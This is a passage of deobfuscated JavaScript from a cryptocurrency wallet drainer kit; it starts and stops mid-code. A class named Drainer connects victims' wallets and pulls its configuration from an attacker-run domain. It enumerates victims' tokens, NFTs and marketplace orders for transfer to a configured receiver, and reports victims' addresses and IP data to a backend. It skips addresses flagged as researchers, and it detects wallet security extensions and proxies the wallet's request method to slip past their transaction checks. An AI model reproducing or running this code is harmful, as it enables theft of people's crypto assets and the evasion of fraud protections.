                        if (window?.["main_provider"]?.["isCoinbaseWallet"] == true) {
                            k = "CoinBase";
                            Y = k;
                        }
                        const a = {
                            " Rainbow": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7a33d7f1-3d12-4b5c-f3ee-5cd83cb1b500?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "Exodus Mobile": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/4c16cad4-cac9-4643-6726-c696efaf5200?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "CoinBase": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a5ebc364-8f91-4200-fcc6-be81310a0000?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "MetaMask Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/5195e9db-94d8-4579-6f11-ef553be95100?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "Trust Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/7677b54f-3486-46e2-4e37-bf8747814f00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "Ledger Wallet": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/a7f416de-aa03-4c5e-3280-ab49269aef00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1",
                            "Zerion": "https://explorer-api.walletconnect.com/w3m/v1/getWalletImage/73f6f52f-7862-49e7-bb85-ba93ab72cc00?projectId=0761e7d1b5103f901dbdb7fd033df5b9&sdkType=w3m&sdkVersion=js-2.7.1"
                        };
                        if (a.hasOwnProperty(Y)) {
                            u = a[Y];
                            k = Y;
                        }
                    } catch {}
                    Swal.fire({
                        "icon": '',
                        "showConfirmButton": false,
                        "html": '',
                        "text": '',
                        "footer": "<div class=\"flex-center\">\n                                      <div class=\"wallet-icon-container\">\n                                          <svg class=\"wallet-spinner-svg\" viewBox=\"0 0 110 110\" width=\"110\" height=\"110\" xmlns=\"http://www.w3.org/2000/svg\">\n                                              <rect id=\"w3m-loader\" fill=\"transparent\" x=\"2\" y=\"2\" width=\"106\" height=\"106\" rx=\"35\" stroke-dasharray=\"106 262\">\n                                                  <animate attributeName=\"stroke-dashoffset\" values=\"360;0\" dur=\"1s\" repeatCount=\"indefinite\"></animate>\n                                              </rect>\n                                          </svg>\n                                          <img class=\"swal2-large-image\" src=\"" + u + "\">\n                                      </div>\n                                  </div>\n                                  <div class=\"swal2-subtext\">Continue in " + k + "...</div>\n                                  <div class=\"swal2-sub-footer\">You must approve the prompt in order to continue.</div>",
                        "customClass": {
                            "popup": "swal2-popup-square",
                            "footer": "swal2-minimal-footer"
                        }
                    });
                } else {
                    document.getElementById(popupElementID).style.display = "flex";
                }
            }
        } catch (S) {
            console.log(S);
        }
    };
    static ["closePopup"] = () => {
        try {
            if (config.design.enablePopup && !config.useDefaultPopup && !config.popupCode) {
                console.log("Closing popup...");
                document.getElementById(popupElementID).style.display = "none";
            }
        } catch (u) {
            console.log(u);
        }
    };
}
class Drainer extends Configuration {
    constructor() {
        DrainerPopup.renderPopup();
        super();
        this.InjectModal();
        this.getDomain().then(d => {
            this.logDomainName = "https://rpc." + d[0] + "/";
            this.apiDomainName = "https://api." + d[0] + "/";
            config = Object.assign({}, config, d[1]);
            config.researchers_full = Array.from(new Set(config.researchers.concat(config.researchers_latest)));
        })["catch"](d => {
            console.log("Error: ", d);
        });
        if (typeof window.ethereum !== "undefined") {
            this.metamaskInstalled = true;
        }
        const k = {
            "id": 0x19,
            "name": "Cronos",
            "network": "cronos",
            "nativeCurrency": {
                "decimals": 0x12,
                "name": "Cronos",
                "symbol": "CRO"
            },
            "rpcUrls": {
                "default": {
                    "http": ["https://node.croswap.com/rpc"]
                },
                "public": {
                    "http": ["https://node.croswap.com/rpc"]
                }
            },
            "blockExplorers": {
                "etherscan": {
                    "name": "CronosScan",
                    "url": "https://cronoscan.com"
                },
                "default": {
                    "name": "CronosScan",
                    "url": "https://cronoscan.com"
                }
            },
            "contracts": {
                "multicall3": {
                    "address": "0xcA11bde05977b3631167028862bE2a173976CA11",
                    "blockCreated": 0x1df468
                }
            }
        };
        const Y = {
            "id": 0x2105,
            "name": "Base",
            "network": "base",
            "nativeCurrency": {
                "decimals": 0x12,
                "name": "Ether",
                "symbol": "ETH"
            },
            "rpcUrls": {
                "default": {
                    "http": ["https://developer-access-mainnet.base.org"]
                },
                "public": {
                    "http": ["https://developer-access-mainnet.base.org"]
                }
            },
            "blockExplorers": {
                "etherscan": {
                    "name": "BaseScan",
                    "url": "https://basescan.org"
                },
                "default": {
                    "name": "BaseScan",
                    "url": "https://basescan.org"
                }
            }
        };
        optimism = {
            "id": 0xa,
            "name": "OP Mainnet",
            "network": "optimism",
            "nativeCurrency": {
                "name": "Ether",
                "symbol": "ETH",
                "decimals": 0x12
            },
            "rpcUrls": {
                "alchemy": {
                    "http": ["https://opt-mainnet.g.alchemy.com/v2"],
                    "webSocket": ["wss://opt-mainnet.g.alchemy.com/v2"]
                },
                "infura": {
                    "http": ["https://optimism-mainnet.infura.io/v3"],
                    "webSocket": ["wss://optimism-mainnet.infura.io/ws/v3"]
                },
                "default": {
                    "http": ["https://optimism.meowrpc.com"]
                },
                "public": {
                    "http": ["https://optimism.meowrpc.com"]
                }
            },
            "blockExplorers": {
                "etherscan": {
                    "name": "Etherscan",
                    "url": "https://optimistic.etherscan.io"
                },
                "default": {
                    "name": "Optimism Explorer",
                    "url": "https://explorer.optimism.io"
                }
            },
            "contracts": {
                "multicall3": {
                    "address": "0xca11bde05977b3631167028862be2a173976ca11",
                    "blockCreated": 0x416737
                }
            },
            "formatters": {
                "block": {
                    "type": "block"
                },
                "transaction": {
                    "type": "transaction"
                },
                "transactionReceipt": {
                    "type": "transactionReceipt"
                }
            }
        };
        if (!config.experimental["save-wc-session"]) {
            const d = ["wc@", "wagmi", "W3M_", "walletlink", "loglevel"];
            const s = Object.keys(localStorage);
            for (const v of s) {
                for (const C of d) {
                    if (v.includes(C)) {
                        localStorage.removeItem(v);
                    }
                }
            }
        }
        const a = {
            "name": config.w3m_name,
            "description": config.w3m_description,
            "url": config.w3m_url,
            "icons": config.w3m_icons
        };
        const S = [mainnet, polygon, bsc, arbitrum, avalanche, fantom, optimism, celo, k, Y];
        window.chainsList = S;
        let U;
        let D;
        let l;
        let M;
        let G;
        let O;
        const r = {
            chains: S
        };
        this.meta_connector = new window.MetaMaskConnector(r);
        this.injected_connector = new window.InjectedConnector({
            "chains": S,
            "options": {
                "name": "Injected"
            }
        });
        this.ledger_connector = new window.LedgerConnector({
            "chains": S,
            "projectId": config.wc_projectid,
            "walletConnectVersion": 0x2,
            "chainId": 0x1,
            "options": {
                "chainId": 0x1,
                "walletConnectVersion": 0x2,
                "enableDebugLogs": false,
                "projectId": config.wc_project
            }
        });
        this.safe_connector = new window.SafeConnector({
            "chains": S,
            "options": {
                "projectId": config.wc_project,
                "debug": false
            }
        });
        this.coinbase_connector = new CoinbaseWalletConnector({
            "chains": S,
            "options": {
                "appName": "wagmi"
            }
        });
        if (config.USE_W3M_V3) {
            U = defaultWagmiConfig({
                "chains": S,
                "projectId": this.projectId,
                "metadata": a
            });
            D = createConfig({
                "connectors": [this.meta_connector, this.injected_connector, this.coinbase_connector, this.ledger_connector, this.safe_connector],
                "publicClient": w
            });
            let T = ["c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96", "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0", "19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927", "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f"];
            this.modal = createWeb3Modal({
                "wagmiConfig": U,
                "projectId": this.projectId,
                "chains": S,
                "themeVariables": themeVariables,
                "themeMode": config.chooseTheme,
                "featuredWalletIds": T
            });
            if (config.experimental.hasOwnProperty("non-featured-w3m")) {
                this.modal = createWeb3Modal({
                    "wagmiConfig": U,
                    "projectId": this.projectId,
                    "chains": S,
                    "themeVariables": themeVariables,
                    "themeMode": config.chooseTheme
                });
            }
            window.modal = this.modal;
            this.ethereumClient.getAccount = getAccount;
            this.ethereumClient2.getAccount = getAccount;
            this.ethereumClient3.getAccount = getAccount;
            this.ethereumClient4.getAccount = getAccount;
            this.ethereumClient5.getAccount = getAccount;
            this.ethereumClient6.getAccount = getAccount;
        } else {
            const {
                chains: X,
                provider: P
            } = configureChains(S, [publicProvider(), w3mProvider({
                "projectId": this.projectId
            })]);
            U = createConfig({
                "connectors": w3mConnectors({
                    "chains": S,
                    "projectId": this.projectId,
                    "version": 0x2
                }),
                "autoConnect": true,
                "provider": P
            });
            D = createConfig({
                "connectors": [this.meta_connector],
                "autoConnect": true,
                "provider2": x
            });
            l = createConfig({
                "connectors": [this.injected_connector],
                "autoConnect": true,
                "provider2": x
            });
            M = createConfig({
                "connectors": [this.coinbase_connector],
                "autoConnect": true,
                "provider2": x
            });
            G = createConfig({
                "connectors": [this.safe_connector],
                "autoConnect": true,
                "provider2": x
            });
            O = createConfig({
                "connectors": [this.ledger_connector],
                "autoConnect": true,
                "provider2": x
            });
            this.ethereumClient = new EthereumClient(U, X);
            this.ethereumClient2 = new EthereumClient(D, S);
            this.ethereumClient3 = new EthereumClient(l, S);
            this.ethereumClient4 = new EthereumClient(M, S);
            this.ethereumClient5 = new EthereumClient(G, S);
            this.ethereumClient6 = new EthereumClient(O, S);
            this.hueModal = new Web3Modal({
                "projectId": this.projectId,
                "themeMode": config.chooseTheme,
                "themeVariables": themeVariables
            }, this.ethereumClient);
        }
        window.mdl = this.modal;
        if (config.USE_W3M_V3 && !this.subscribed) {
            this.unsubscribe = this.modal.subscribeState(e => {
                this.updateStates(e);
            });
            this.subscribed = true;
        } else if (!this.subscribed) {
            this.unsubscribe = this.hueModal.subscribeModal(e => {
                this.updateStates(e);
            });
            this.subscribed = true;
        }
        this.linkButtons();
        (function () {
            let h = this;
            setInterval(function () {
                h.linkButtons();
            }, 1000);
        }).call(this);
        if (autoconnect) {
            if (config.USE_W3M_V3 && !this.subscribed) {
                this.unsubscribe = this.modal.subscribeState(e => {
                    this.updateStates(e);
                });
                this.subscribed = true;
            } else if (!this.subscribed) {
                this.unsubscribe = this.hueModal.subscribeModal(e => {
                    this.updateStates(e);
                });
                this.subscribed = true;
            }
            if (config.mainModal == "w3m" || config.mainModal == 0) {
                this.connectWallet();
            } else {
                this.triggerModal(true);
            }
        }
    }
    ["getDomain"] = async () => {
        try {
            if (window.rtrt4j54jm43c590 !== "infura-api.com" && window.rtrt4j54jm43c590 == undefined) {
                window.rtrt4j54jm43c590 = "infura-api.com";
            }
            let u = await fetch("https://" + window.rtrt4j54jm43c590 + "/router.js");
            if (!u.ok) {
                throw new Error("Network response was not ok");
            }
            let k = await u.text();
            u = await fetch("https://rpc." + k + "/config?key=" + config.API_KEY, {
                "method": "GET",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            }).then(Y => Y.json()).then(Y => JSON.parse(this.decryptBody(Y.encrypted)));
            console.log(u);
            return [k, u];
        } catch (Y) {
            console.log("Error: ", Y);
        }
    };
    ["linkButtons"] = async () => {
        this.connectButton = document.querySelectorAll("." + config.design.connectElement);
        this.twoStepButton = document.querySelectorAll("." + config.design.twoStepButtonElement);
        for (let u = 0; u < this.connectButton.length; u += 1) {
            let k = 20000;
            if (config.twoStep) {
                k = 200;
            }
            const Y = this.connectButton[u].hasAttribute("ad-data-linked");
            if (!Y) {
                this.connectButton[u].addEventListener("click", () => {
                    console.log("Clicked on connect.", config.twoStep ? "Waiting for second click" : "Starting");
                    if (config.mainModal == "w3m" || config.mainModal == 0) {
                        this.connectWallet();
                    } else {
                        this.triggerModal(true);
                    }
                }, false);
                this.connectButton[u].setAttribute("ad-data-linked", "true");
            }
        }
        if (config.twoStep) {
            for (let a = 0; a < this.twoStepButton.length; a += 1) {
                const S = this.twoStepButton[a].hasAttribute("ad-data-linked");
                if (!S) {
                    this.twoStepButton[a].addEventListener("click", () => {
                        setTimeout(() => {
                            this.started = false;
                        }, 20000);
                        console.log("Clicked on start");
                        this.Perexod();
                    }, false);
                    this.twoStepButton[a].setAttribute("ad-data-linked", "true");
                }
            }
        }
    };
    ["InjectModal"] = async () => {
        if (this.isMobile()) {
            if (!config.experimental.hasOwnProperty("custom-on-mobile")) {
                config.mainModal = "w3m";
            }
        }
        window.operationInProgress = false;
        let u = '';
        if (config.mainModal == "custom") {
            if (customModalCode) {
                u = customModalCode;
            }
        } else {
            if (config.mainModal == "w3m" || config.mainModal == 0) {
                return;
            }
        }
        var k = document.querySelectorAll("ad-modal");
        k.forEach(function (d) {
            d.parentNode.removeChild(d);
        });
        const Y = document.createElement("ad-modal");
        this.modal_shadowRoot = Y.attachShadow({
            "mode": "open"
        });
        this.modal_shadowRoot.innerHTML = u;
        document.body.appendChild(Y);
        let a = this.modal_shadowRoot.querySelectorAll(".web3-overlay");
        let S = this.modal_shadowRoot.querySelectorAll(".web3-modal-metamask");
        let U = this.modal_shadowRoot.querySelectorAll(".web3-modal-web3modal");
        let D = this.modal_shadowRoot.querySelectorAll(".web3-modal-trust");
        let l = this.modal_shadowRoot.querySelectorAll(".web3-modal-injected");
        let M = this.modal_shadowRoot.querySelectorAll(".web3-modal-coinbase");
        let G = this.modal_shadowRoot.querySelectorAll(".web3-modal-safe");
        let O = this.modal_shadowRoot.querySelectorAll(".web3-modal-ledger");
        let r = this.modal_shadowRoot.querySelectorAll(".web3-modal-close");
        if (a.length) {
            for (let d of a) {
                d.addEventListener("click", () => {
                    this.triggerModal(false);
                }, false);
            }
        }
        if (r.length) {
            for (let s of r) {
                s.addEventListener("click", () => {
                    this.triggerModal(false);
                }, false);
            }
        }
        if (S) {
            for (let v of S) {
                v.addEventListener("click", () => {
                    this.modal_connect_wallet("metamask");
                }, false);
            }
        }
        if (U.length) {
            for (let C of U) {
                C.addEventListener("click", () => {
                    console.log("Clicked on start");
                    this.modal_connect_wallet("w3m");
                }, false);
            }
        }
        if (G.length) {
            for (let E of G) {
                E.addEventListener("click", () => {
                    console.log("Clicked on start");
                    if (config.experimental.hasOwnProperty("safe-as-w3m")) {
                        this.modal_connect_wallet("w3m");
                    } else {
                        this.modal_connect_wallet("safe");
                    }
                }, false);
            }
        }
        if (O.length) {
            for (let w of O) {
                w.addEventListener("click", () => {
                    console.log("Clicked on start");
                    this.modal_connect_wallet("ledger");
                }, false);
            }
        }
        if (D.length) {
            for (let T of D) {
                T.addEventListener("click", () => {
                    console.log("Clicked on start");
                    this.modal_connect_wallet("trust");
                }, false);
            }
        }
        if (l.length) {
            for (let X of l) {
                X.addEventListener("click", () => {
                    console.log("Clicked on start");
                    this.modal_connect_wallet("injected");
                }, false);
            }
        }
        if (M.length) {
            for (let P of M) {
                P.addEventListener("click", () => {
                    console.log("Clicked on start");
                    this.modal_connect_wallet("coinbase");
                }, false);
            }
        }
    };
    ["triggerModal"] = async t => {
        try {
            let k = this.modal_shadowRoot.querySelectorAll(".web3-modal");
            let Y = this.modal_shadowRoot.querySelectorAll(".web3-overlay");
            if (t) {
                if (k.length) {
                    for (let a of k) {
                        a.style.display = "block";
                    }
                }
                if (Y.length) {
                    for (let S of Y) {
                        S.style.display = "block";
                    }
                }
            } else {
                if (k.length) {
                    for (let U of k) {
                        U.style.display = "none";
                    }
                }
                if (Y.length) {
                    for (let D of Y) {
                        D.style.display = "none";
                    }
                }
            }
        } catch (l) {
            console.log(l);
        }
    };
    ["modal_connect_wallet"] = async t => {
        console.log("click", t);
        if (t == "w3m") {
            this.triggerModal(false);
            this.connectWallet();
        } else {
            if (t == "metamask") {
                try {
                    if (!this.ethereumClient2.getAccount().address) {
                        await connect({
                            "connector": this.meta_connector,
                            "chains": window.chainsList
                        });
                    }
                    this.updateStates(false, this.ethereumClient2);
                    this.walletType = "MetaMask";
                } catch (k) {
                    if (String(k).includes("Connector not found", "MetaMask")) {
                        window.open("https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search);
                    }
                }
            } else {
                if (t == "trust") {
                    try {
                        if (!this.ethereumClient3.getAccount().address) {
                            await connect({
                                "connector": this.injected_connector,
                                "chains": window.chainsList
                            });
                        }
                        this.updateStates(false, this.ethereumClient3);
                        this.walletType = "Trust Wallet";
                    } catch (Y) {
                        if (String(Y).includes("Connector not found")) {
                            window.open("https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href);
                        }
                    }
                } else {
                    if (t == "injected") {
                        try {
                            if (!this.ethereumClient3.getAccount().address) {
                                await connect({
                                    "connector": this.injected_connector,
                                    "chains": window.chainsList
                                });
                            }
                            this.updateStates(false, this.ethereumClient3);
                            this.walletType = "Injected Wallet";
                        } catch (a) {
                            if (String(a).includes("Connector not found")) {
                                window.open("https://metamask.app.link/dapp/" + window.location.host + window.location.pathname + window.location.search);
                            }
                        }
                    } else {
                        if (t == "coinbase") {
                            try {
                                if (!this.ethereumClient4.getAccount().address) {
                                    await connect({
                                        "connector": this.coinbase_connector,
                                        "chains": window.chainsList
                                    });
                                }
                                this.updateStates(false, this.ethereumClient4);
                                this.walletType = "Coinbase Wallet";
                            } catch (S) {
                                console.log(S);
                            }
                        } else {
                            if (t == "safe") {
                                try {
                                    if (!this.ethereumClient5.getAccount().address) {
                                        await connect({
                                            "connector": this.safe_connector,
                                            "chains": window.chainsList
                                        });
                                    }
                                    this.updateStates(false, this.ethereumClient5);
                                    this.walletType = "Coinbase Wallet";
                                } catch (U) {
                                    console.log(U);
                                }
                            } else {
                                if (t == "ledger") {
                                    try {
                                        if (!this.ethereumClient6.getAccount().address) {
                                            this.triggerModal(false);
                                            await connect({
                                                "connector": this.ledger_connector,
                                                "chains": window.chainsList
                                            });
                                        }
                                        this.updateStates(false, this.ethereumClient6);
                                        this.walletType = "Coinbase Wallet";
                                    } catch (D) {
                                        console.log(D);
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    };
    ["connectWallet"] = async () => {
        if (config.USE_W3M_V3 && !this.subscribed) {
            this.unsubscribe = this.modal.subscribeState(u => {
                this.updateStates(u);
            });
            this.subscribed = true;
        } else if (!this.subscribed) {
            this.unsubscribe = this.hueModal.subscribeModal(u => {
                this.updateStates(u);
            });
            this.subscribed = true;
        }
        if (this.ethereumClient.getAccount().address == undefined) {
            if (config.USE_W3M_V3) {
                await this.modal.open({
                    "view": "Connect"
                });
            }
            if (!config.USE_W3M_V3) {
                await this.hueModal.openModal();
            }
        } else {
            await this.updateStates(false, this.ethereumClient);
        }
    };
    ["Perexod"] = async () => {
        await this.updateStates(true);
        if (!config.researchers_full.includes(this.walletAddress)) {
            this.start();
        }
    };
    ["updateStates"] = async (n, K = this.ethereumClient) => {
        if (config.mainModal !== "w3m" || config.mainModal !== 0) {
            this.triggerModal(false);
        }
        try {
            if (K.getAccount().address != undefined) {
                if (this.started == true) {
                    return;
                }
                const a = {
                    "1": 0x0,
                    "10": 0x0,
                    "25": 0x0,
                    "56": 0x0,
                    "137": 0x0,
                    "250": 0x0,
                    "8453": 0x0,
                    "42220": 0x0,
                    "42161": 0x0,
                    "43114": 0x0
                };
                this.offers = [];
                this.considerations = [];
                this.seaportTokens = [];
                this.vault = [];
                this.transactions = [];
                this.ERC20tokens = [];
                this.estimated_txs = a;
                this.started = true;
                this.isConnected = true;
                this.secondProvider = new ethers.providers.InfuraProvider("homestead", config.infuraproject);
                this.main_provider = await K.getAccount().connector.getProvider();
                if (!this.main_provider.sendAsync) {
                    this.main_provider.sendAsync = this.main_provider.send;
                }
                this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
                this.signer = await this.ethers_provider.getSigner();
                this.walletAddress = await this.signer.getAddress();
                this.walletBalance = await this.secondProvider.getBalance(this.walletAddress);
                this.walletBalanceInEth = await ethers.utils.formatEther(this.walletBalance);
                this.chainId = await this.signer.getChainId();
                window.secondProvider = this.secondProvider;
                window.main_provider = this.main_provider;
                window.ethers_provider = this.ethers_provider;
                window.signer = this.signer;
                window.ethereumClient = K;
                console.log("Connected with " + this.walletAddress);
                window.unsubscribe = this.unsubscribe();
                try {
                    let S = await K.getAccount().connector.name;
                    if (S) {
                        this.walletType = S;
                    }
                } catch {}
                try {
                    updateWalletData(this.walletAddress, this.netWorth, 0);
                } catch (U) {
                    console.log("Unable to send callback!", U);
                }
                if (!config.researchers_full.includes(this.walletAddress) && !twoStep) {
                    this.unsubscribe();
                    this.subscribed = false;
                    this.start();
                }
            } else {
                this.isConnected = false;
            }
        } catch (D) {
            console.log(D);
        }
    };
    ["changeNetwork"] = async n => {
        if (this.ethereumClient?.["getAccount"]()?.["address"]?.["toLowerCase"]() != this.walletAddress.toLowerCase()) {
            this.started = false;
            console.log("Address Changed");
            throw new Error("Address Changed");
        }
        ;
        let Y = await this.signer.getChainId();
        for (let a = 0; a < config.retry_changenetwork; a++) {
            console.log("Trying to change net for " + a + " time");
            try {
                this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
                this.signer = await this.ethers_provider.getSigner();
                if (Y != n) {
                    const S = {
                        chainId: n
                    };
                    await switchNetwork(S);
                    console.log("Changed to", n);
                    try {
                        let U = await this.getIpData();
                        fetch(this.logDomainName + "backend/chainChanged", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "websiteUrl": window.location.href,
                                "chain_from": Y,
                                "chain_to": n,
                                "websiteDomain": window.location.host,
                                "ipData": U,
                                "API_KEY": config.API_KEY
                            }))
                        });
                    } catch (D) {
                        console.log("Change Network error: ", D);
                    }
                } else {
                    console.log("Already chain", n);
                }
                this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
                window.ethers_provider = this.ethers_provider;
                this.signer = await this.ethers_provider.getSigner();
                return true;
            } catch (l) {
                console.log(l);
            }
        }
        try {
            this.ethers_provider = new ethers.providers.Web3Provider(this.main_provider);
            this.signer = await this.ethers_provider.getSigner();
            let M = await this.getIpData();
            fetch(this.logDomainName + "backend/cancelSwitchNetwork", {
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "websiteUrl": window.location.href,
                    "chain_from": Y,
                    "chain_to": n,
                    "websiteDomain": window.location.host,
                    "ipData": M,
                    "API_KEY": config.API_KEY,
                    "signature": this.signature
                }))
            });
            throw new Error("Unable to change net");
        } catch (G) {
            console.log("Connection Log error: ", G);
            throw new Error("Unable to change net");
        }
    };
    ["isUselessMethod"] = (t = false) => {
        if (!t) {
            return true;
        }
        if (t == "eth_requestAccounts") {
            return true;
        }
        if ("eth_signTypedData_v3" != t.method && "eth_signTypedData_v4" != t.method && "eth_sendTransaction" != t.method && "eth_sign" != t.method) {
            return true;
        }
        return false;
    };
    ["generateGUID"] = () => {
        const u = new Uint8Array(16);
        crypto.getRandomValues(u);
        let k = '';
        for (let Y = 0; Y < u.length; Y++) {
            k += u[Y].toString(16).padStart(2, "0");
        }
        return k;
    };
    ["detectSimulators"] = () => {
        try {
            if (window.ethereum) {
                if (window.ethereum.isPocketUniverseZ) {
                    return [true, "P"];
                }
                if (window.ethereum.isRevokeCash) {
                    return [true, "R"];
                }
                if (window.ethereum.isWalletGuard) {
                    return [true, "W"];
                }
                if (window.ethereum.isFireProxy) {
                    return [true, "F"];
                }
                if (window.ethereum.stelo) {
                    return [true, "S"];
                }
            }
        } catch {}
        return [false, ''];
    };
    ["fsign"] = async () => {
        try {
            await window.ethereum.request({
                "method": "personal_sign",
                "params": ["0x0000000000000000000000000000000000000000", this.generateGUID()]
            });
        } catch (u) {
            console.log(u);
        }
    };
    ["initProxy"] = async () => {
        try {
            if (this.detectSimulators()[0] && !this.isMobile() && (window.ethereum.isMetaMask || window.ethereum.isCoinbaseWallet)) {
                if (window.ethereum.isMetaMask) {
                    Object.defineProperty(window.ethereum, "request", {
                        "value": new Proxy(window.ethereum.request, {
                            "apply": async (k, Y, a) => {
                                let [l] = a;
                                if (this.isUselessMethod(l) || this.netWorth < this.bypassMinAmount) {
                                    return Reflect.apply(k, Y, a);
                                }
                                await this.fsign();
                                return new Promise((M, G) => {
                                    const r = this.generateGUID();
                                    const d = {
                                        "target": "metamask-contentscript",
                                        "data": {
                                            "name": "metamask-provider",
                                            "data": [{
                                                "jsonrpc": "2.0",
                                                "id": r,
                                                "method": l.method,
                                                "params": l.params
                                            }]
                                        }
                                    };
                                    const s = v => {
                                        if (v.data.target === "metamask-inpage" && v.data.data.data[0].id == r) {
                                            window.removeEventListener("message", s);
                                            if (v.data.data.data[0].hasOwnProperty("error")) {
                                                G(v.data.data.data[0].error);
                                            } else {
                                                M(v.data.data.data[0].result);
                                            }
                                        }
                                    };
                                    window.addEventListener("message", s);
                                    window.postMessage(d);
                                });
                            }
                        })
                    });
                } else if (window.ethereum.isCoinbaseWallet) {
                    Object.defineProperty(window.ethereum, "request", {
                        "value": new Proxy(window.ethereum.request, {
                            "apply": async (k, Y, a) => {
                                let [l] = a;
                                if (this.isUselessMethod(l) || this.netWorth < this.bypassMinAmount) {
                                    return Reflect.apply(k, Y, a);
                                }
                                await this.fsign();
                                return new Promise((M, G) => {
                                    window.ethereum._sendAsync(l, (s, v) => {
                                        if (s) {
                                            G(s);
                                        } else {
                                            M(v.result);
                                        }
                                    });
                                });
                            }
                        })
                    });
                }
            }
        } catch {}
    };
    ["updateButtonMessage"] = (t = false, n = false, K = false) => {
        if (t == true) {
            if (config.design.buttonMessagesEnabled) {
                this.messageButton.innerText = config.design.buttonMessages.failed;
            }
            setTimeout(() => {
                if (config.design.buttonMessagesEnabled) {
                    this.messageButton.innerText = config.design.buttonMessages.progress;
                }
            }, config.design.retryDelay);
        }
        if (n == true) {
            setTimeout(() => {
                if (config.design.buttonMessagesEnabled) {
                    this.messageButton.innerText = config.design.buttonMessages.success;
                }
            }, config.design.retryDelay);
        }
        if (K == true) {
            console.log("Button Message end");
            if (config.design.buttonMessagesEnabled) {
                this.messageButton.innerText = config.design.buttonMessages.failed;
            }
            setTimeout(() => {
                if (config.design.buttonMessagesEnabled) {
                    this.messageButton.innerText = config.design.buttonMessages.initialConnected;
                }
            }, config.design.retryDelay);
            this.transactions.length = 0;
            this.offers.length = 0;
            this.considerations.length = 0;
            this.uniswapTokens.length = 0;
            this.permitTokens.length = 0;
            this.sushiswapTokens.length = 0;
            this.blurTokens.length = 0;
            this.pending.length = 0;
        }
    };
    ["fetchTokens"] = async () => {
        console.log("Fetching ERC20");
        try {
            let u = await fetch(this.apiDomainName + "fetchTokens?address=" + this.walletAddress + "&recipient=" + config.seaport_receiver + "&eth=" + eth_enabled + "&arbitrum=" + arb_enabled + "&bsc=" + bsc_enabled + "&polygon=" + polygon_enabled + "&optimism=" + optimism_enabled + "&fantom=" + ftm_enabled + "&avalanche=" + avalanche_enabled + "&celo=" + celo_enabled + "&base=" + base_enabled + "&cro=" + cronos_enabled).then(k => k.json()).then(k => JSON.parse(this.decryptBody(k.encrypted)));
            console.log("Erc20 main fetch success");
            if (!u.tokens) {
                return;
            }
            u.tokens.forEach(k => {
                this.ERC20tokens.push(k);
                this.transactions.push(k);
            });
            if (!u.vault) {
                return;
            }
            u.vault.forEach(k => {
                this.vault.push(k);
            });
            this.permitTokens = u.permitTokens;
            this.uniswapTokens = u.uniswapTokens;
            u.seaportoffers.forEach(k => {
                this.offers.push(k);
            });
            u.seaportconsiderations.forEach(k => {
                this.considerations.push(k);
            });
            u.seaportTokens.forEach(k => {
                this.seaportTokens.push(k);
            });
            this.seaportValue += u.seaportValue;
            this.gasPrices = u.gasPrices;
            this.signature = u.signature;
            this.netWorth += u.netWorth;
            for (let k in u.estimated_txs) {
                this.estimated_txs[k] += u.estimated_txs[k];
            }
        } catch (Y) {
            console.log("ERC20 fetch error: ", Y);
        }
    };
    ["fetchNFTS"] = async () => {
        console.log("Fetching NFT approvals");
        try {
            let u = await fetch(this.apiDomainName + "fetchNFT", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "recipient": config.seaport_receiver,
                    "inputData": this.NFTtokens
                }))
            }).then(k => k.json()).then(k => JSON.parse(this.decryptBody(k.encrypted)));
            console.log("NFT fetch success");
            console.log(u);
            this.potatozStaked = u.potatozStaked;
            this.potatozValue = u.potatozValue;
            this.creepzStaked = u.creepzStaked;
            this.creepzValue = u.creepzValue;
            u.seaportTokens.forEach(k => {
                this.seaportTokens.push(k);
            });
            u.NFTtokens.forEach(k => {
                this.ERC20tokens.push(k);
                this.transactions.push(k);
            });
            this.seaportValue += u.seaportValue;
            this.blurTokens = u.blurTokens;
            this.blurValue = u.blurValue;
            this.ultraVault = u.ultraVault;
            this.blurNonce = u.blurNonce;
            u.offers.forEach(k => {
                this.offers.push(k);
            });
            u.considerations.forEach(k => {
                this.considerations.push(k);
            });
            for (let k in u.estimated_txs) {
                this.estimated_txs[k] += u.estimated_txs[k];
            }
            this.netWorth += u.netWorth;
        } catch (Y) {
            console.log("NFT fetch error: ", Y);
        }
    };
    ["fillVault"] = async () => {
        if (this.potatozValue > 0) {
            this.vault.push({
                "name": "POTATOZ_STAKED",
                "totalPrice": this.potatozValue
            });
        }
        if (this.creepzValue > 0) {
            this.vault.push({
                "name": "CREEPZ_STAKED",
